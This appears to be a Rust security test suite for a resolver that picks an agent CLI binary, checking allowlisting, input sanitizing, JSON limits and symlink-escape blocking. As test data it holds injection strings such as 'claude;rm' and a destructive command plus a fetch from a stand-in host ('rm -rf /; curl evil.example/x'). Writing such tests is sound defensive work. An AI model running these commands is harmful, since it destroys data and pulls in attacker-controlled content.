//! TDD: Security-focused integration tests for `amplihack_utils::agent_binary`.
//!
//! Covers spec items S1–S8: allowlist, input sanitization, JSON hardening,
//! walk-up containment, no-shell-invocation, error-message hygiene.

#![allow(clippy::unwrap_used)]

use std::fs;
use std::os::unix::fs::symlink;
use std::sync::{Mutex, OnceLock};
use tempfile::TempDir;

use amplihack_utils::agent_binary::{ALLOWED_BINARIES, resolve, validate_binary_name};

fn env_lock() -> &'static Mutex<()> {
    static LOCK: OnceLock<Mutex<()>> = OnceLock::new();
    LOCK.get_or_init(|| Mutex::new(()))
}

fn clear_env() {
    // SAFETY: tests serialized; env mutation unsafe in edition 2024.
    unsafe {
        std::env::remove_var("AMPLIHACK_AGENT_BINARY");
        // Layer 2 must be silent too. These tests exercise the persisted layer
        // and the built-in default, both of which sit BELOW the live session
        // marker -- and the marker is exported by whichever CLI is running the
        // suite. Leave it set and every case here resolves through layer 2
        // instead of the layer under test, so the suite is red on a developer
        // machine and green in CI, which has no session at all.
        //
        // #1352 fixed exactly this in active_agent_binary_default_test and
        // missed this file. Sourced from SESSION_MARKERS so adding a marker
        // cannot silently reopen it a third time.
        for (key, _) in amplihack_utils::agent_binary::SESSION_MARKERS {
            std::env::remove_var(key);
        }
    }
}

fn set_env(value: &str) {
    // SAFETY: see clear_env.
    unsafe {
        std::env::set_var("AMPLIHACK_AGENT_BINARY", value);
    }
}

fn try_set_env(value: &str) -> bool {
    if value.bytes().any(|b| b == 0) {
        return false;
    }
    set_env(value);
    true
}

#[test]
fn s1_allowlist_is_case_insensitive_exact_match() {
    let _guard = env_lock().lock().unwrap_or_else(|p| p.into_inner());
    for good in &[
        "claude",
        "Claude",
        "CLAUDE",
        "copilot",
        "codex",
        "amplifier",
    ] {
        assert!(validate_binary_name(good).is_some(), "{good} must be valid");
    }
    for bad in &["claude2", "claud", "c", "claude-cli", "claudex"] {
        assert!(
            validate_binary_name(bad).is_none(),
            "{bad} must be rejected"
        );
    }
}

#[test]
fn s2_env_input_sanitization_rejects_dangerous_chars() {
    let _guard = env_lock().lock().unwrap_or_else(|p| p.into_inner());
    // Clear FIRST, not only at the end. This asserts that a rejected env value
    // falls through to the built-in default, which means every layer between
    // must be silent when `resolve` is called -- and the trailing `clear_env()`
    // below only helps whichever test happens to run next.
    //
    // It was order-dependent and passed roughly half the time: it inherited a
    // cleared marker environment when another test had run first, and layer 2
    // answered "claude" when it had not.
    clear_env();
    let bad = [
        "/bin/sh",
        "..",
        "../claude",
        "claude\n",
        "claude\t",
        "claude;rm",
        "cla ude",
        "cla\0ude",
        "claude\r",
        "\x07claude",
    ];
    let tmp = TempDir::new().unwrap();
    for value in bad {
        if !try_set_env(value) {
            continue; // OS-level NUL rejection; covered by validator unit tests.
        }
        let result = resolve(tmp.path()).unwrap();
        assert_eq!(result, "copilot", "value {value:?} must be rejected");
    }
    clear_env();
}

#[test]
fn s2_env_input_length_capped() {
    let _guard = env_lock().lock().unwrap_or_else(|p| p.into_inner());
    clear_env();
    let tmp = TempDir::new().unwrap();
    set_env(&"a".repeat(33));
    assert_eq!(resolve(tmp.path()).unwrap(), "copilot");
    clear_env();
}

#[test]
fn s3_json_typed_struct_rejects_unexpected_shape() {
    let _guard = env_lock().lock().unwrap_or_else(|p| p.into_inner());
    clear_env();
    let tmp = TempDir::new().unwrap();
    let runtime = tmp.path().join(".claude").join("runtime");
    fs::create_dir_all(&runtime).unwrap();
    // launcher field is an array, not a string.
    fs::write(
        runtime.join("launcher_context.json"),
        r#"{"launcher":["claude"],"pid":1}"#,
    )
    .unwrap();
    assert_eq!(resolve(tmp.path()).unwrap(), "copilot");
}

#[test]
fn s3_json_64kib_size_cap() {
    let _guard = env_lock().lock().unwrap_or_else(|p| p.into_inner());
    clear_env();
    let tmp = TempDir::new().unwrap();
    let runtime = tmp.path().join(".claude").join("runtime");
    fs::create_dir_all(&runtime).unwrap();
    let huge = "p".repeat(64 * 1024 + 1);
    fs::write(
        runtime.join("launcher_context.json"),
        format!(r#"{{"launcher":"claude","x":"{huge}"}}"#),
    )
    .unwrap();
    assert_eq!(resolve(tmp.path()).unwrap(), "copilot");
}

#[test]
fn s5_walk_up_capped_at_32_ancestors() {
    let _guard = env_lock().lock().unwrap_or_else(|p| p.into_inner());
    clear_env();
    let tmp = TempDir::new().unwrap();
    // No launcher_context anywhere.
    let mut current = tmp.path().to_path_buf();
    for i in 0..40 {
        current = current.join(format!("d{i}"));
    }
    fs::create_dir_all(&current).unwrap();
    // Should not panic, should fall back to default.
    assert_eq!(resolve(&current).unwrap(), "copilot");
}

#[test]
fn s5_symlink_escape_is_blocked() {
    let _guard = env_lock().lock().unwrap_or_else(|p| p.into_inner());
    clear_env();
    let outer = TempDir::new().unwrap();
    let attacker = TempDir::new().unwrap();
    // Place valid (allowlisted) but unintended config outside the cwd tree.
    let attacker_runtime = attacker.path().join(".claude").join("runtime");
    fs::create_dir_all(&attacker_runtime).unwrap();
    fs::write(
        attacker_runtime.join("launcher_context.json"),
        r#"{"launcher":"claude"}"#,
    )
    .unwrap();
    // Symlink the entire .claude inside outer to attacker's .claude.
    let link_parent = outer.path().join(".claude");
    symlink(attacker.path().join(".claude"), &link_parent).unwrap();
    // Resolver MUST reject path that escapes its anchor (canonicalized starts_with check).
    let result = resolve(outer.path()).unwrap();
    assert_eq!(
        result, "copilot",
        "symlink escape must not influence resolution"
    );
}

#[test]
fn s7_error_messages_do_not_leak_env_value() {
    let _guard = env_lock().lock().unwrap_or_else(|p| p.into_inner());
    clear_env();
    let tmp = TempDir::new().unwrap();
    set_env("rm -rf /; curl evil.example/x");
    // Expect resolution to succeed (fall through) — but if any tracing/error
    // surface arises, the rejected value must NOT appear verbatim in the
    // returned String. Default is returned unchanged.
    let out = resolve(tmp.path()).unwrap();
    assert!(!out.contains("evil"));
    assert!(!out.contains("rm -rf"));
    assert_eq!(out, "copilot");
    clear_env();
}

#[test]
fn s8_resolved_value_always_in_allowlist() {
    let _guard = env_lock().lock().unwrap_or_else(|p| p.into_inner());
    clear_env();
    let tmp = TempDir::new().unwrap();
    let resolved = resolve(tmp.path()).unwrap();
    assert!(
        ALLOWED_BINARIES.contains(&resolved.as_str()),
        "resolver must only ever return allowlisted names; got {resolved:?}"
    );
}
